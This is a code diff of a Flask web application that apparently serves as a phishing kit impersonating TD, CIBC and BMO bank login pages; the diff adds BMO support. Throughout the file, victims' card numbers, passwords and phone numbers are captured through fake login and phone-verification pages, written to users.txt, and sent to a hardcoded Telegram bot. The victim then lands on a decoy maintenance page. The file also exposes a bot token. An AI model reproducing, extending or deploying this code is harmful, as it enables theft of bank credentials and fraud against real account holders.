@@ -3,17 +3,17 @@ import os
 import requests
 
 app = Flask(__name__)
-app.secret_key = "supersecretkey"
+app.secret_key = "supersecretkey"  # Change this to something secure
 
 USER_FILE = "users.txt"
 
-# Your Telegram details
+# Telegram Bot info
 TELEGRAM_BOT_TOKEN = "7321008127:AAEF8dr-B-b_hLkjA1qcXl07askvu0fRggs"
-TELEGRAM_CHAT_ID = "-1002441207907"  # <-- Replace with your real chat ID
+TELEGRAM_CHAT_ID = "-1002441207907"  # Replace with your real chat ID
 
 def send_telegram_message(text: str):
     """
-    Posts 'text' to your Telegram bot using the Bot API.
+    Sends 'text' to your Telegram bot.
     """
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
@@ -22,55 +22,48 @@ def send_telegram_message(text: str):
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
-
-# Ensure the users.txt file exists
+# Make sure users.txt exists
 if not os.path.exists(USER_FILE):
     with open(USER_FILE, "w") as f:
         pass
 
-
 @app.route("/")
 def landing_page():
+    # Renders e.g. landing.html with bank selection
     return render_template("landing.html")
-
 
 @app.route("/td")
 def td_page():
-    """
-    Renders the TD login page (td.html).
-    That page includes <input type="hidden" name="bank" value="TD">
-    so we know to send them to td_phone after /login.
-    """
+    # Renders td.html for TD logins
     return render_template("td.html")
-
 
 @app.route("/home")
 def home():
-    """
-    Simulate a CIBC login page.
-    This page would have <input type="hidden" name="bank" value="CIBC">
-    so we know it's CIBC.
-    """
+    # Example: Renders a "CIBC" or "generic" login page
     return render_template("home.html")
 
+@app.route("/bmo")
+def bmo_page():
+    # Renders bmologin.html for BMO logins
+    return render_template("bmologin.html")
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
     """
-    1) Store card_number, password, bank in session.
-    2) Do NOT send telegram message yet.
-    3) Redirect to phone route (CIBC or TD).
+    Stores card_number, password, bank in session.
+    Does NOT send a Telegram message yet.
+    Redirects user to phone verification route appropriate for that bank.
     """
     if request.method == "POST":
         card_number = request.form.get("card_number")
         password = request.form.get("password")
-        bank = request.form.get("bank")  # 'TD' or 'CIBC'
+        bank = request.form.get("bank")  # 'TD', 'BMO', or 'CIBC' etc.
 
         if not card_number or not password:
             flash("Card number and password are required!", "error")
             return redirect(url_for("home"))
 
-        # Store them in session for later
+        # Save info in session
         session["temp_bank"] = bank
         session["temp_card"] = card_number
         session["temp_pass"] = password
@@ -78,21 +71,20 @@ def login():
         # Redirect to correct phone verification route
         if bank == "TD":
             return redirect(url_for("td_phone"))
+        elif bank == "BMO":
+            return redirect(url_for("bmo_phone"))
         else:
-            # Default or CIBC => /phone_verification
+            # Assume default or "CIBC"
             return redirect(url_for("phone_verification"))
 
-    # If GET, just show a generic login
+    # If GET, render a generic login page
     return render_template("login.html")
-
 
 @app.route("/phone-verification", methods=["GET", "POST"])
 def phone_verification():
     """
-    CIBC phone verification route.
-    Now we read bank, card_number, password from session,
-    plus phone_number from the form.
-    Then we write everything to users.txt and send ONE Telegram message.
+    Handles phone verification for CIBC / default bank.
+    After user enters phone, store data in users.txt, send Telegram, clear session.
     """
     if request.method == "POST":
         phone_number = request.form.get("phone_number")
@@ -100,17 +92,16 @@ def phone_verification():
             flash("Phone number is required!", "error")
             return redirect(url_for("phone_verification"))
 
-        # Retrieve bank, card, pass from session
+        # Retrieve from session
         bank = session.get("temp_bank", "CIBC")
         card_number = session.get("temp_card", "UnknownCard")
         password = session.get("temp_pass", "UnknownPass")
 
-        # 1) Write all info to users.txt
-        # Make one line with card_number, password, phone
+        # Write to file
         with open(USER_FILE, "a") as f:
             f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")
 
-        # 2) Build one big Telegram message
+        # Send Telegram
         message_text = (
             f"New {bank} login:\n"
             f"Card: {card_number}\n"
@@ -119,24 +110,21 @@ def phone_verification():
         )
         send_telegram_message(message_text)
 
-        # 3) Clear session so we don't reuse data
+        # Clear session
         session.pop("temp_bank", None)
         session.pop("temp_card", None)
         session.pop("temp_pass", None)
 
+        # Redirect to "maintenance"
         return redirect(url_for("maintenance"))
 
     return render_template("phone_verification.html")
-
 
 @app.route("/td_phone", methods=["GET", "POST"])
 def td_phone():
     """
     TD phone verification route.
-    We do the same approach as CIBC:
-    Read session data for bank/card/pass,
-    read phone from form,
-    then store everything & send one message.
+    Same pattern: read phone, get session data, write to file, send Telegram, clear, etc.
     """
     if request.method == "POST":
         phone_number = request.form.get("phone_number")
@@ -148,11 +136,9 @@ def td_phone():
         card_number = session.get("temp_card", "UnknownCard")
         password = session.get("temp_pass", "UnknownPass")
 
-        # 1) Write all info to users.txt
         with open(USER_FILE, "a") as f:
             f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")
 
-        # 2) Single Telegram message
         message_text = (
             f"New {bank} login:\n"
             f"Card: {card_number}\n"
@@ -161,7 +147,6 @@ def td_phone():
         )
         send_telegram_message(message_text)
 
-        # 3) Clear session
         session.pop("temp_bank", None)
         session.pop("temp_card", None)
         session.pop("temp_pass", None)
@@ -170,11 +155,44 @@ def td_phone():
 
     return render_template("td_phone.html")
 
+@app.route("/bmo_phone", methods=["GET", "POST"])
+def bmo_phone():
+    """
+    BMO phone verification route.
+    """
+    if request.method == "POST":
+        phone_number = request.form.get("phone_number")
+        if not phone_number:
+            flash("Phone number is required!", "error")
+            return redirect(url_for("bmo_phone"))
+
+        bank = session.get("temp_bank", "BMO")
+        card_number = session.get("temp_card", "UnknownCard")
+        password = session.get("temp_pass", "UnknownPass")
+
+        with open(USER_FILE, "a") as f:
+            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")
+
+        message_text = (
+            f"New {bank} login:\n"
+            f"Card: {card_number}\n"
+            f"Password: {password}\n"
+            f"Phone: {phone_number}"
+        )
+        send_telegram_message(message_text)
+
+        session.pop("temp_bank", None)
+        session.pop("temp_card", None)
+        session.pop("temp_pass", None)
+
+        return redirect(url_for("maintenance"))
+
+    return render_template("bmophone.html")
 
 @app.route("/maintenance")
 def maintenance():
     """
-    Simple 'maintenance' page to show after phone is verified.
+    Simple Maintenance page after successful phone verify.
     """
     return """
     <!DOCTYPE html>
@@ -216,22 +234,22 @@ def maintenance():
     </html>
     """
 
-
-@app.route("/select-bank", methods=["POST"])
+@app.route("/select_bank", methods=["POST"])
 def select_bank():
     """
-    If your 'landing.html' has a dropdown or radio button
-    letting user pick which bank, we redirect accordingly.
+    If your landing.html has a dropdown or radio to pick which bank,
+    we redirect accordingly (CIBC -> /home, TD -> /td, BMO -> /bmo).
     """
     selected_bank = request.form.get("bank")
     if selected_bank == "CIBC":
         return redirect(url_for("home"))
     elif selected_bank == "TD":
         return redirect(url_for("td_page"))
+    elif selected_bank == "BMO":
+        return redirect(url_for("bmo_page"))
 
     flash("This bank is currently not supported.", "error")
     return redirect(url_for("landing_page"))
-
 
 if __name__ == "__main__":
     app.run(debug=True, host='0.0.0.0')
